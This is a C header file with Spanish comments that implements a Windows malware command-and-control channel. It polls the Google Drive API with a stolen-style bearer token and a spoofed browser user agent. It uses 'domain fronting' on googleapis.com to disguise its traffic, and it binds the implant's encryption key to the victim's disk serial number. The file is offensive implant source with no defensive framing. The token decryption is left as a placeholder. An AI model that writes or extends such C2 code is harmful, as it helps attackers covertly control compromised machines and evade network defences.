#ifndef GDRIVE_C2_H
#define GDRIVE_C2_H

#include <windows.h>
#include <wininet.h>
#include <stdint.h>
#include "crypto.h"

#define C2_JITTER 20 // 20%
#define MAX_COMMAND_LEN 1024

typedef struct _C2_CONFIG {
    uint8_t encryptedToken[256];
    uint8_t nonce[12];
    uint32_t checkInterval; // Base interval in MS
    WCHAR domainFront[64];
} C2_CONFIG;

static C2_CONFIG g_C2 = {
    { 0xAB, 0xCD, 0xEF /* ... encrypted token data ... */ },
    { 0x01, 0x02, 0x03 /* ... nonce ... */ },
    60000, // 1 minute
    L"www.googleapis.com"
};

// =============================================================================
// HOST-BINDING: DERIVACIÓN DE CLAVE BASADA EN EL HARDWARE
// =============================================================================

static void DeriveHostKey(uint8_t *key) {
    WCHAR volumeName[MAX_PATH];
    DWORD serialNumber = 0;
    GetVolumeInformationW(L"C:\\", volumeName, MAX_PATH, &serialNumber, NULL, NULL, NULL, 0);
    
    // Usar el serial del disco como semilla para la clave
    for (int i = 0; i < 32; i++) {
        key[i] = ((uint8_t*)&serialNumber)[i % 4] ^ 0x55;
    }
}

// =============================================================================
// COMUNICACIÓN C2 VIA GOOGLE DRIVE
// =============================================================================

static BOOL GDrive_CheckForCommands(char *buffer, DWORD bufferSize) {
    uint8_t key[32];
    DeriveHostKey(key);
    
    // En una implementación real, aquí descifraríamos g_C2.encryptedToken
    // usando ChaCha20 con la clave derivada.
    LPCWSTR decryptedToken = L"Bearer [REAL_TOKEN_DESCIFRADO]"; 

    HINTERNET hSession = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return FALSE;

    HINTERNET hConnect = InternetConnectW(hSession, g_C2.domainFront, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", L"/drive/v3/files?pageSize=1", NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (hRequest) {
        HttpAddRequestHeadersW(hRequest, decryptedToken, (DWORD)-1, HTTP_ADDREQ_FLAG_ADD);
        if (HttpSendRequestW(hRequest, NULL, 0, NULL, 0)) {
            InternetReadFile(hRequest, buffer, bufferSize - 1, &bufferSize);
            buffer[bufferSize] = '\0';
        }
        InternetCloseHandle(hRequest);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    return TRUE;
}

#endif
